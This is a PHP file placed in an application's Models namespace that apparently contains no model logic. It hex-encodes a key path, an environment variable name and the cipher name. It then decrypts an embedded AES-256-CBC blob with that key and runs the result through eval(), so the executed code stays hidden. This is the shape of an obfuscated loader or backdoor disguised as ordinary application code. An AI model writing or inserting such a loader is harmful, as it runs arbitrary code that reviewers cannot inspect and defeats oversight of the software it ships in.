<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('BAri4tyQp2Z6bcgNefcfmQ==');

$c=base64_decode(

'38xXvRcl9lvA4aZ/sHbbce3nPqTU0z80g4JfOFEZc0Y3yWi8/uff9tsC5Bqzr7tisWUKtxG3PpVQ' .
'6Tz/nv80PVefizwlo505lR/Y2+ubRu2UmHOZVMiGdgMAjucPhrALtdi7L1U3PwZEQHly5Xbz024z' .
'UHc23o3aXvL2te7z2cBDMnNuAMa21OXyJpf2lCSmlmuU7pUIqlZFLg6mtN8r3ZtTcyfGSahs3Foy' .
'j0mwLGYT0qSHbd1cE37PfwbmJFrpURurkbJkCHU4WqqqI++xBstoC1BT1tMLA99eX6yaQlQb7h/E' .
'QmfdJ5bdATn/4/q0Rj0Mfem2XzsWaAUi1U9Ps0B1H/hf2AT9S3tPHdSGFJInwD4TweNb8+6yH+IJ' .
'XV6D85J0Tg8QtmsNEZYVy0Gz9+qhCLBWDz5ChBEeYPiuqzsBXDT3h8shv9WvNIoBAX3FY1S2LJM6' .
'vMhLFmwL6CCIMmnr152trgOR5tkZX8lPJDLxGN4TLpvCAbZKme1xWcW3GTSE46BDhYb0NTQ80Lay' .
'HfLXLrLDRu4xj5h0zGXPk29uBDNLFPC/6iCl9U0HjgxeSA0H79OcM0iHAIcxBT+b5MfDXHHw0M40' .
'oVF+VNIdjsSQ6ueV2OQogs51gfU0ci3ORVe/MNkVEKd9zN3EHgDrZ4TDEAEt7o5Uo8nSzZHKyGi6' .
'bISqaRnitwN3A3+HxStik78OrzsxGLsO9WwMT1j4cYWwPHeBNo2fNEUyMh4tfprca/Z9Ehi1Dso4' .
'U96Y2RVs5RlQfhHown1D+ONAuwEwWPBq/tzRRNP3HAsIMDs6P5npavm5Li3UQEDuAbh4C7y+l2vt' .
'RIHA2SGMxMolWJ9MfE0nKVqUUFHQQUKQMoaPTxfDOa4E8nsJgpGOjha2LPcuC/rWhusQ893RlIlz' .
'ArK6BfI+uxccM7OhhJKHvMJrEMoPbqvf9Xf1KDitslZ5TmYnKg7gU/Avx8PH1og+YLxduA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

